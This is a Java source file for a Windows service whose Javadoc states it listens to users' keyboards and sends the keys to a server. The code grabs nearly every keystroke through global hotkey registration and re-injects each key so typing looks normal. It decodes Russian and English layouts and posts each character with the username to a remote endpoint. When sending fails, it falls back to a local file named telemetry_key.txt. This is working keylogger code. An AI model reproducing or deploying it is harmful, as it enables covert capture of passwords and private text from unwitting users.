package ru.danilov.service.runnable;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.time.LocalDate;
import java.time.LocalTime;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Служба для прошлушивания клавиатуры windows-пользователей и отправки клавиши на сервер.
 *
 * @author danilovey
 * @version 0.1
 */
public class UserWindowsKeyListenerService implements Runnable {
	private final Logger LOG = LoggerFactory.getLogger(UserWindowsKeyListenerService.class);
	/**Имя пользователя.*/
	private final String username = System.getProperty("user.name");
	/**Пул потоков.*/
	private final ExecutorService keysThreadPool = Executors.newFixedThreadPool(25);
	/**Нажат ли CapsLock.*/
	private boolean isCapsLock = false;
	/**ID клавиши.*/
	private int id;
	private final String urlPathServer;
	private boolean isRun = true;
    private final String pathTemp = "C:\\Temp\\KolaerService";		

	public UserWindowsKeyListenerService(final String urlPathServer) {
		if(urlPathServer != null) {
			this.urlPathServer = urlPathServer;
		} else {
			this.urlPathServer = "http://localhost:8080/";
		}
	}

	@Override
	public void run() {		
		CompletableFuture.runAsync(() -> {
			Thread.currentThread().setName("Прослушивание клавиатуры");
			
			//Регистрируем клавиши ( пропуская комбинации с ctrl, alt, win и т.д. с нестандарными клавишами)
			for(int i = 8; i <= 222; i++){
				User32.RegisterHotKey(null, i, 0, i);
				
				if(i>40) {
					User32.RegisterHotKey(null, i + 1000, User32.MOD_ALT, i);
					User32.RegisterHotKey(null, i + 2000, User32.MOD_CONTROL, i);
					User32.RegisterHotKey(null, i + 3000, User32.MOD_SHIFT, i);
					User32.RegisterHotKey(null, i + 4000, User32.MOD_WIN, i);
				}
			}
			
			final User32.MSG msg = new User32.MSG();
			
			if(User32.GetKeyState(20) == 1)
				this.isCapsLock = true;
			
			boolean shift = false;
			boolean ctrl = false;
			boolean alt = false;
			//Получаем системные сообщения
			while(User32.GetMessage(msg, null, 0, 0, User32.PM_REMOVE)){
				//Если остановка службы, то убираем все клавиши
				if(!this.isRun) {
					for(int i = 8; i <= 222; i++){
						User32.UnregisterHotKey(null, i);
						if(i>40) {
							User32.UnregisterHotKey(null, i + 1000);
							User32.UnregisterHotKey(null, i + 2000);
							User32.UnregisterHotKey(null, i + 3000);
							User32.UnregisterHotKey(null, i + 4000);
						}
					}
					this.keysThreadPool.shutdown();
					break;
				}
				
				//Если это клавиша
				if(msg.message == User32.WM_HOTKEY){
					
					this.id = msg.wParam.intValue();
					//Получаем id клавиши без комбинации
					if(this.id > 4000)
						this.id -= 4000;
					else if(this.id > 3000)
						this.id -= 3000;
					else if(this.id > 2000)
						this.id -= 2000;
					if(this.id > 1000)
						this.id -= 1000;
					
					//Убрираем из прослушивания клавишу
					User32.UnregisterHotKey(null, this.id);
					User32.UnregisterHotKey(null, this.id + 1000);
					User32.UnregisterHotKey(null, this.id + 2000);
					User32.UnregisterHotKey(null, this.id + 3000);
					User32.UnregisterHotKey(null, this.id + 4000);
					
					final int idTemp = this.id;
					//Получаем язык раскладки
					final boolean isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
					//Статус Shift
					final int shiftKey = User32.GetKeyState(16);
					
					//В потоке отправляем клавишу
					CompletableFuture.runAsync(() -> {
						Thread.currentThread().setName("Отправление клавиши на сервер!");
						
						if(idTemp == 20)
							this.isCapsLock = !this.isCapsLock;
						//Получаем символ клавиши в зависимости от языка
						String key = isRus ? getRusKey(idTemp) : getEngKey(idTemp);
					
						if(shiftKey < 0){
							key = this.getShiftKey(idTemp, key, isRus);
						}else if(this.isCapsLock){
							if(65 <= idTemp && idTemp <= 90){
								key = key.toUpperCase();
							}
						}

						try {
							final URL url = new URL(this.urlPathServer + "/system/user/"+URLEncoder.encode(username, "UTF-8")+"/key");
							final HttpURLConnection conn = (HttpURLConnection) url.openConnection();
							conn.setDoOutput(true);
							conn.setRequestMethod("POST");
							conn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");

							final OutputStream os = conn.getOutputStream();
							os.write(key.getBytes(Charset.forName("UTF-8")));
							os.flush();
							os.close();

							conn.getResponseCode();

							conn.disconnect();
						} catch (final Exception e) {
	                		final String fileName = "telemetry_key.txt";
	                		
	                		final LocalDate localDate = LocalDate.now();               		
	                		final File path = new File(pathTemp + "\\" + localDate);
	                		path.mkdirs();
	                    	LOG.error("Сохранение в локальную папку: {} ...", path);
	                    	
							try(final PrintWriter prWr = new PrintWriter(new BufferedWriter(new FileWriter(pathTemp + "\\" + localDate + "\\" + fileName, true)))) {
							    prWr.println(LocalTime.now() + " | " + URLEncoder.encode(key, "UTF-8"));
							} catch (final IOException e1) {
								LOG.error("Ошибка!", e1);
							}
						}

					}, keysThreadPool);
					
					User32.keybd_event(this.id, 0, 0, 0);;

					if(shift && (User32.GetKeyState(0xA1) & 0x8000) == 0){
						shift = false;
						User32.keybd_event(0x10, 0, 2, 0);
					} else if((User32.GetKeyState(0xA1) & 0x8000) == 32768){
							shift = true;
					}

					if(ctrl && (User32.GetKeyState(0xA3) & 0x8000) == 0){
						ctrl = false;
						User32.keybd_event(0x11, 0, 2, 0);
					} else if((User32.GetKeyState(0xA3) & 0x8000) == 32768){
							ctrl = true;
					}

					if(alt && (User32.GetKeyState(0xA5) & 0x8000) == 0){
						alt = false;
						User32.keybd_event(0x12, 0, 2, 0);
					} else if((User32.GetKeyState(0xA5) & 0x8000) == 32768){
							alt = true;
					}

					User32.RegisterHotKey(null, this.id, 0, this.id);
					
					if(this.id>40) {
						User32.RegisterHotKey(null, this.id + 1000, User32.MOD_ALT, this.id);
						User32.RegisterHotKey(null, this.id + 2000, User32.MOD_CONTROL, this.id);
						User32.RegisterHotKey(null, this.id + 3000, User32.MOD_SHIFT, this.id);
						User32.RegisterHotKey(null, this.id + 4000, User32.MOD_WIN, this.id);
					}
				}
			}
		}).exceptionally(t -> {
			LOG.error("Ошибка!", t);
			this.stop();
			return null;
		});		
	}
	
	//@Override
	private void stop() {
		this.isRun = false;
		
		for(int i = 8; i <= 222; i++){
			User32.UnregisterHotKey(null, i);
			if(i>40) {
				User32.UnregisterHotKey(null, i + 1000);
				User32.UnregisterHotKey(null, i + 2000);
				User32.UnregisterHotKey(null, i + 3000);
				User32.UnregisterHotKey(null, i + 4000);
			}
		}
		
		this.keysThreadPool.shutdown();
		try {
			this.keysThreadPool.awaitTermination(1, TimeUnit.MINUTES);
		} catch (InterruptedException e) {
			LOG.error("Привышен лимин ожидания завершения потоков!");
		} finally {
			this.keysThreadPool.shutdownNow();
		}
	}
	
	/**Получение символа + Shift клавиши по коду.*/
	private String getShiftKey(int code, final String key, final boolean isRus) {		
		if(65 <= code && code <= 90){
			return this.isCapsLock ? key.toLowerCase() : key.toUpperCase();
		}else{
			switch(code) {
				case 48: return ")";
				case 49: return "!";
				case 50: return isRus ? "\"" : "@";
				case 51: return isRus ? "№" : "#";
				case 52: return isRus ? ";" : "$";
				case 53: return "%";
				case 54: return isRus ? ":" : "^";
				case 55: return isRus ? "?" : "&";
				case 56: return "*";
				case 57: return "(";
				case 219: return isRus ? key.toUpperCase() : "{";
				case 220: return isRus ? "/" : "|";
				case 221: return isRus ? key.toUpperCase() : "}";
				case 187: return "+";
				case 188: return isRus ? key.toUpperCase() : "<";
				case 189: return "_";
				case 190: return isRus ? key.toUpperCase() : ">";
				case 191: return isRus ? "," : "?";
				case 192: return isRus ? key.toUpperCase() : "~";
				case 222: return isRus ? key.toUpperCase() : "\"";
				default: return key.toUpperCase();
			}
		}
	}
	
	/**Получение символа клавиши с русской раскладкой.*/
	private String getRusKey(int code) {
		switch(code) {
			case 65: return "ф";
			case 66: return "и";
			case 67: return "с";
			case 68: return "в";
			case 69: return "у";
			case 70: return "а";
			case 71: return "п";
			case 72: return "р";
			case 73: return "ш";
			case 74: return "о";
			case 75: return "л";
			case 76: return "д";
			case 77: return "ь";
			case 78: return "т";
			case 79: return "щ";
			case 80: return "з";
			case 81: return "й";
			case 82: return "к";
			case 83: return "ы";
			case 84: return "е";
			case 85: return "г";
			case 86: return "м";
			case 87: return "ц";
			case 88: return "ч";
			case 89: return "н";
			case 90: return "я";
			case 186: return "ж";
			case 188: return "б";
			case 190: return "ю";
			case 191: return ".";
			case 192: return "ё";
			case 219: return "х";
			case 221: return "ъ";
			case 222: return "э";
			default: return getEngKey(code);
		}
	}
	
	/**Получение символа клавиши с англ. раскладкой.*/
	private String getEngKey(int code) {
		switch(code) {
			case 8: return "<BaskSpace>";
			case 9: return "<Tab>";
			case 13: return "<Enter>";
			case 16: return "<Shift>";
			case 17: return "<Ctrl>";
			case 18: return "<Alt>";
			case 19: return "<Pause>";
			case 20: return "<CapsLock>";
			case 27: return "<Esc>";
			case 32: return "<Spase>";
			case 33: return "<PageUp>";
			case 34: return "<PageDown>";
			case 35: return "<End>";
			case 36: return "<Home>";
			case 37: return "<ArrowLeft>";
			case 38: return "<ArrowUp>";
			case 39: return "<ArrowRigth>";
			case 40: return "<ArrowDown>";
			case 44: return "<PrtScr>";
			case 45: return "<Insert>";
			case 46: return "<Delete>";
			case 48: return "0";
			case 49: return "1";
			case 50: return "2";
			case 51: return "3";
			case 52: return "4";
			case 53: return "5";
			case 54: return "6";
			case 55: return "7";
			case 56: return "8";
			case 57: return "9";
			case 65: return "a";
			case 66: return "b";
			case 67: return "c";
			case 68: return "d";
			case 69: return "e";
			case 70: return "f";
			case 71: return "g";
			case 72: return "h";
			case 73: return "i";
			case 74: return "j";
			case 75: return "k";
			case 76: return "l";
			case 77: return "m";
			case 78: return "n";
			case 79: return "o";
			case 80: return "p";
			case 81: return "q";
			case 82: return "r";
			case 83: return "s";
			case 84: return "t";
			case 85: return "u";
			case 86: return "v";
			case 87: return "w";
			case 88: return "x";
			case 89: return "y";
			case 90: return "z";
			case 91: return "<WinLeft>";
			case 92: return "<WinRigth>";
			case 93: return "<Context>";
			case 96: return "<NumPad 0>";
			case 97: return "<NumPad 1>";
			case 98: return "<NumPad 2>";
			case 99: return "<NumPad 3>";
			case 100: return "<NumPad 4>";
			case 101: return "<NumPad 5>";
			case 102: return "<NumPad 6>";
			case 103: return "<NumPad 7>";
			case 104: return "<NumPad 8>";
			case 105: return "<NumPad 9>";
			case 106: return "<NumPad *>";
			case 107: return "<NumPad +>";
			case 109: return "<NumPad ->";
			case 110: return "<NumPad  .>";
			case 111: return "<NumPad />";
			case 112: return "<F1>";
			case 113: return "<F2>";
			case 114: return "<F3>";
			case 115: return "<F4>";
			case 116: return "<F5>";
			case 117: return "<F6>";
			case 118: return "<F7>";
			case 119: return "<F8>";
			case 120: return "<F9>";
			case 121: return "<F10>";
			case 122: return "<F11>";
			case 123: return "<F12>";
			case 144: return "<NumLock>";
			case 145: return "<ScrollLock>";
			case 154: return "<PrintScreen>";
			case 186: return ";";
			case 187: return "=";
			case 188: return ",";
			case 189: return "-";
			case 190: return ".";
			case 191: return "/";
			case 192: return "`";
			case 219: return "[";
			case 220: return "\\";
			case 221: return "]";
			case 222: return "'";
			default: return String.valueOf("Unknow: " + code);
		}
	}
}